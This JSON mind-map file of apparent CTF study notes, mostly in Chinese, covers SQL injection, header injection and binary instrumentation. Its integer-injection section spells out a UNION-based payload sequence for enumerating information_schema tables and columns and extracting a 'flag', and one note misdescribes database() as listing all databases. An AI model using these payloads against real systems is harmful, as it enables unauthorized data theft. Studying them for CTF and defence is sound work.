{
    "content": "<div style='display: flex; justify-content: center; align-items: center;'><img src='../img/injection.png' alt='Injection' style='width: 100px; height: 100px;'></div> <div style='padding-bottom: 5px; text-align: center;'><font color='teal'><h3>Injection</h3></font></div>",
    "depth": 1,
    "children": [
        {
            "content": "<h4>SQL Injection 数据库</h4>",
            "depth": 2,
            "children": [
                {
                    "content": "<b>整数型注入</b>",
                    "depth": 3,
                    "children": [
                        {
                            "content": "⚠️注意输出的个数, 相应地限制注入后的结果个数, 如果数目不一致是不会有结果的,<br>所以要循序渐进地限制数据库再限制表名最后爆字段名, 整个过程都需要一致限制结果的数目",
                            "depth": 4
                        },
                        {
                            "content": "判断是否存在整数型注入: <code>where id=2-1</code>",
                            "depth": 4
                        },
                        {
                            "content": "判断列名: <code>where id=1 order by 1,2,……</code>",
                            "depth": 4
                        },
                        {
                            "content": "假设列名为 1 和 2, 用 <code>union select</code> 查询两次",
                            "depth": 4,
                            "children": [
                                {
                                    "content": "让前一次的查询结果为空以暴露更多的信息, 假设表中没有 id=-1 的值, 此时显示为后一个的查询结果",
                                    "depth": 5
                                },
                                {
                                    "content": "后一次查询必须和前一次查询的列数一致(这里假设中是两列), 不然返回空",
                                    "depth": 5
                                },
                                {
                                    "content": "<code>where id=-1 union select 3,4</code>",
                                    "depth": 5
                                }
                            ]
                        },
                        {
                            "content": "得到数据库名称(假设为 sqli)后再去爆表",
                            "depth": 4,
                            "children": [
                                {
                                    "content": "<code>database()</code> 是一个特殊的函数, 用于返回数据库服务器上所有可用数据库的列表",
                                    "depth": 5
                                },
                                {
                                    "content": "<code>where id=-1 union select 3, (select table_name from information_schema.tables where table_schema='sqli')</code>",
                                    "depth": 5
                                },
                                {
                                    "content": "限制输出的个数, 由于这里假设输出个数为 2, 所以 <code>limit 0,1</code> 表示从第 0 条开始取 1 条记录",
                                    "depth": 5
                                },
                                {
                                    "content": "<code>where id=-1 union select 3, (select table_name from information_schema.tables where table_schema='sqli' limit 1,1)</code>",
                                    "depth": 5
                                }
                            ]
                        },
                        {
                            "content": "分别获得数据库名称和表名后, 接着爆字段名",
                            "depth": 4,
                            "children": [
                                {
                                    "content": "假设表名是 flag,<br><code>where id=-1 union select 3, (select column_name from information_schema.columns where table_schema='sqli' and table_name='flag')</code>",
                                    "depth": 5
                                },
                                {
                                    "content": "同样的需要限制输出的个数,<br><code>where id=-1 union select 3, (select column_name from information_schema.columns where table_schema='sqli' and table_name='flag' limit 0,1)",
                                    "depth": 5
                                },
                                {
                                    "content": "⚠️为什么不能是<code>where id=-1 union select column_name from information_schema.columns where table_schema='sqli' and table_name='flag' limit 0,2</code><br>因为这样返回的结果是两行而不是两列",
                                    "depth": 5
                                }
                            ]
                        },
                        {
                            "content": "最后根据数据库、表名、字段查询即可, <code>where id=-1 union select 3, (select flag from sqli.flag limit 0 ,1)</code>",
                            "depth": 4
                        }
                    ]
                },
                {
                    "content": "<b>字符型注入</b>",
                    "depth": 3
                },
                {
                    "content": "<b>报错注入</b>",
                    "depth": 3
                },
                {
                    "content": "<b>盲注</b>",
                    "depth": 3,
                    "children": [
                        {
                            "content": "攻击者无法获得任何错误回显消息, 此时需要利用一些方法进行判断或者尝试, 逐渐推断出数据库中的敏感信息",
                            "depth": 4
                        },
                        {
                            "content": "<b>布尔盲注</b>",
                            "depth": 4,
                            "children": [
                                {
                                    "content": "页面返回的结果只有两种: 正确和错误",
                                    "depth": 5
                                },
                                {
                                    "content": "通过构造 SQL 判断语句, 查看页面的返回结果来判断哪些 SQL 判断条件成立",
                                    "depth": 5
                                }
                            ]
                        },
                        {
                            "content": "<b>时间盲注</b>",
                            "depth": 4,
                            "children": [
                                {
                                    "content": "无论输入什么值, 只会回显一个界面",
                                    "depth": 5
                                },
                                {
                                    "content": "又称延时注入, 即通过具有延时功能的 sleep、benchmark 等时间函数, 查看页面返回的时间差来判断注入的语句是否正确",
                                    "depth": 5
                                }
                            ]
                        },
                        {
                            "content": "⚠️注:<br>可以进行布尔盲注的地方也可以进行时间盲注, 但可以进行时间盲注的地方不一定可以进行布尔盲注<br>在盲注测试时, 通常先测试是否可以布尔盲注, 若不行再尝试时间盲注",
                            "depth": 4
                        }
                    ]
                },
                {
                    "content": "<b>SQL 结构</b>",
                    "depth": 3,
                    "children": [
                        {
                            "content": "<b>WHERE 后注入</b>",
                            "depth": 4
                        },
                        {
                            "content": "<b>AND/OR 注入</b>",
                            "depth": 4
                        },
                        {
                            "content": "<b>ORDER BY 注入</b>",
                            "depth": 4
                        },
                        {
                            "content": "<b>UPDATE 注入</b>",
                            "depth": 4
                        },
                        {
                            "content": "<b>INSERT 注入</b>",
                            "depth": 4
                        }
                    ]
                },
                {
                    "content": "<b>过滤空格</b>",
                    "depth": 3
                },
                {
                    "content": "tools",
                    "depth": 4,
                    "children": [
                        {
                            "content": "<b><i>sqlmap</i></b>",
                            "depth": 5
                        }
                    ]
                },
                {
                    "content": "<b>……</b>",
                    "depth": 3
                }
            ]
        },
        {
            "content": "<h4>Request Head Injection</h4>",
            "depth": 3,
            "children": [
                {
                    "content": "<b>Cookie 注入</b>",
                    "depth": 4
                },
                {
                    "content": "<b>UA 注入</b>",
                    "depth": 4
                },
                {
                    "content": "<b>Refer 注入</b>",
                    "depth": 4
                },
                {
                    "content": "<b>二次注入</b>",
                    "depth": 4
                }
            ]
        },
        {
            "content": "<h4>Code Injection</h4>",
            "depth": 2,
            "children": [
                {
                    "content": "不同于基于源代码的插桩, 侧重于二进制插桩",
                    "depth": 3
                },
                {
                    "content": "<a href='https://www.youtube.com/watch?v=8Z-5aTpk_l0'>Consideration</a>",
                    "depth": 3,
                    "children": [
                        {
                            "content": "<b>1. Code Insertion</b>",
                            "depth": 4,
                            "children": [
                                {
                                    "content": "<del>Dynamic Binary Translation</del>",
                                    "depth": 5,
                                    "children": [
                                        {
                                            "content": "Analyse/Instrument <b>during runtime</b>",
                                            "depth": 6
                                        },
                                        {
                                            "content": "Repeatedly pay translation cost",
                                            "depth": 6
                                        }
                                    ]
                                },
                                {
                                    "content": "Static Binary Rewriting",
                                    "depth": 5,
                                    "children": [
                                        {
                                            "content": "Perform all tasks <b>prior to runtime</b>",
                                            "depth": 6
                                        },
                                        {
                                            "content": "Analogous to compiler(e.g. LLVM IR)",
                                            "depth": 6
                                        }
                                    ]
                                }
                            ]
                        },
                        {
                            "content": "<b>2. Code Invocation</b>",
                            "depth": 4,
                            "children": [
                                {
                                    "content": "<del>Trampolined Invocation</del>",
                                    "depth": 5,
                                    "children": [
                                        {
                                            "content": "在目标函数的汇编代码中插入一些跳转指令, 将控制流引导到附加的代码段, 然后再跳回到原始函数继续执行<br>这种技术通常需要考虑目标函数的堆栈帧、参数传递方式以及控制流的管理"
                                        },
                                        {
                                            "content": "Transfer to/from 'payload' function",
                                            "depth": 6
                                        },
                                        {
                                            "content": "Repeatedly pay CF(control flow) redirection cost",
                                            "depth": 6
                                        }
                                    ]
                                },
                                {
                                    "content": "Inline Invocation(内联)",
                                    "depth": 5
                                }
                            ]
                        },
                        {
                            "content": "<b>3. Register Usage(活跃度)</b>",
                            "depth": 4,
                            "children": [
                                {
                                    "content": "<del>Liveness Unaware</del>",
                                    "depth": 5,
                                    "children": [
                                        {
                                            "content": "Reset all regs around instrumentation",
                                            "depth": 5
                                        },
                                        {
                                            "content": "Cost of saving and restoring adds up",
                                            "depth": 5
                                        }
                                    ]
                                },
                                {
                                    "content": "Liveness Aware",
                                    "depth": 5,
                                    "children": [
                                        {
                                            "content": "track register liveness for Code Optimization",
                                            "depth": 6
                                        },
                                        {
                                            "content": "track liveness to prioritize dead reg(因为某些寄存器的保存和恢复成本更高)",
                                            "depth": 6
                                        }
                                    ]
                                }
                            ]
                        },
                        {
                            "content": "<b>4. Scalability</b>",
                            "depth": 4,
                            "children": [
                                {
                                    "content": "Common Platforms(Linux x86-64, Windows PE32+)",
                                    "depth": 5
                                },
                                {
                                    "content": "Common Characteristics(C, C++, PIE and non-PIE, Stripped of debug symbols)",
                                    "depth": 5
                                }
                            ]
                        }
                    ]
                },
                {
                    "content": "Taxnonmy",
                    "depth": 3,
                    "children": [
                        {
                            "content": "<b>Static Binary Rewriting</b>(逆向)",
                            "depth": 4,
                            "children": [
                                {
                                    "content": "Unit Instrumentation 单元级插桩",
                                    "depth": 5
                                }
                            ]
                        },
                        {
                            "content": "<b>Dynamic Binary Translation</b>(运行时)",
                            "depth": 4,
                            "children": [
                                {
                                    "content": "Instruction Instrumentation 指令级插桩",
                                    "depth": 5
                                },
                                {
                                    "content": "动态链接库(DLL)注入",
                                    "depth": 5
                                }
                            ]
                        }
                    ]
                }
            ]
        },
        {
            "content": "<h4>Reference</h4>",
            "depth": 2,
            "children": [
                {
                    "content": "<a>https://ctf-wiki.org/web/sqli/</a>",
                    "depth": 3
                }
            ]
        }
    ]
}